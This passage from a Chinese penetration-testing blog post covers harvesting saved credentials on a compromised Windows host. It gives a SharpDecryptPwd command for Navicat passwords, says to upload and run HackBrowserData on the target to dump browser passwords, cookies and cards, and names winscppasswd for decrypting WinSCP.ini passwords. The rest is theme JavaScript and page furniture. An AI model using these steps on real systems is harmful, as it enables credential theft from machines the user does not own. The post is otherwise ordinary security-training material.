+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpDecryptPwd.exe  -NavicatCrypto</span><br></pre></td></tr></table></figure>
+
+<h2 id="获取浏览器保存的登录凭据"><a href="#获取浏览器保存的登录凭据" class="headerlink" title="获取浏览器保存的登录凭据"></a>获取浏览器保存的登录凭据</h2><p>Web浏览器通常会保存网站用户名和密码等凭据，以避免多次手动输入。且以加密格式存储在本地文件中，可以通过读取特定的文件，从Web浏览器获取凭据</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData">HackBrowserData</a>是一个浏览器数据（密码|历史记录|Cookie|书签|信用卡|下载记录|localStorage|浏览器插件）的导出工具，支持全平台主流浏览器。</p>
+<p>只需要将这个文件上传到目标主机，然后直接运行即可</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301011546308.png" alt="image-20230101154619175" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230101154619175</span></div></div>
+
+<p>可以得到被解密后的账户密码信息</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301011548947.png" alt="image-20230101154813878" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230101154813878</span></div></div>
+
+<h2 id="获取WinSCP保留的登录凭据"><a href="#获取WinSCP保留的登录凭据" class="headerlink" title="获取WinSCP保留的登录凭据"></a>获取WinSCP保留的登录凭据</h2><p>WinSCP是Windows环境下使用的SSH的开源图形化FTP工具客户端，在使用SFTP连接时，如果勾选了保存密码，WinSCP就会将密码保存在<code>WinSCP.ini</code>文件下</p>
+<p>Winscppasswd工具可以解密</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/anoopengineer/winscppasswd">winscppasswd</a>这个则是通过被加密的密码进行解密，需要知道host和username</p>
+
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/07/03/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%952/">内网资源探测</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/07/03/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Kerberos/">Kerberos攻击方式【委派还没总结】</a></div></section></div>
+
+
+
+
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>本站由 <a href="/">@anonymity</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = stellar.config.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.19.0';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+    root : '/',
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://gcore.jsdelivr.net/npm/jquery@3.6.2/dist/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
+  }
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/vanilla-lazyload@17.8.3/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.css","js":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://gcore.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://gcore.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://gcore.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".swiper-slide img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
